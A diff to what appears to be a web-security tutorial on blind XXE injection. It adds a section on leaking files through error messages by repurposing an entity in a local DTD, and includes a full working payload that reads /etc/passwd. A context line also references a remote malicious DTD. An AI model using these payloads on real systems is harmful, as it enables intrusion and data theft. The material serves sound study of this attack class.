@@ -336,4 +336,41 @@ The DTD sent to the server that will trigger the malicious DTD will be,
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://target.site.com/malicious.dtd"> %xxe;]>
 ```
 
-We can exfiltrate any data using this technique as long as the error messages are shown. 
+We can exfiltrate any data using this technique as long as the error messages are shown.
+
+### Exfiltrate sensitive data by modifying an existing entity of external DTD
+
+Till now the way we exploited blind XXE Injection was using **Out-Of-Band** techniques where, a malicious DTD was loaded from our site and used.
+
+>**Note:** The reason for using external DTD **stored in our server** is because, as per XML specification, defining an external parameter entity inside another parameter entity is not allowed in internal DTD but allowed in external DTD. Although some parsers might allow but, most of them don't.
+
+What if, **Out-of-Band** connections are blocked? It means we cannot load external DTD from our own server and exploit it. In that case we can trigger an error containing sensitive data by *modifying an existing entity and then, triggering an error.*
+
+>Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. This technique was pioneered by Arseniy Sharoglazov, and ranked #7 in the top 10 web hacking techniques of 2018.\
+*Source: PortSwigger Web Academy*
+
+In order for this technique to work we need a DTD file that is on the filesystem. We can search Google for common DTD files in a system and get a list of it.
+
+Let's say theres a DTD file `/usr/share/yelp/dtd/dockbookx.dtd` in the filesystem.
+Now, our payload would be,
+
+```xml
+<!DOCTYPE exploit [
+<!ENTITY % external_dtd SYSTEM "file:///usr/share/yelp/dtd/dockbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%external_dtd;
+]>
+```
+
+The above payload looks similar to our previous payload with some major difference,
+
+1. We first load `external_dtd` which gets DTD from the file on the system, `/usr/share/yelp/dtd/dockbookx.dtd`.
+2. After loading the external entity `external_dtd`, we then **repurpose** an **existing** entity. `ISOamso` is an entity defined on the DTD `/usr/share/yelp/dtd/dockbookx.dtd`.
+3. We repurpose `ISOamso` to create a dynamic declaration of external entity that creates another external entity.
+4. When `ISOamso` is evaluated we get an error which is exactly same as our previous exploit.
+5. At last, on our DTD we use the `external_dtd` that will evaluate it's entity including our repurposed entity `ISOamso` which in turn, triggers the error.
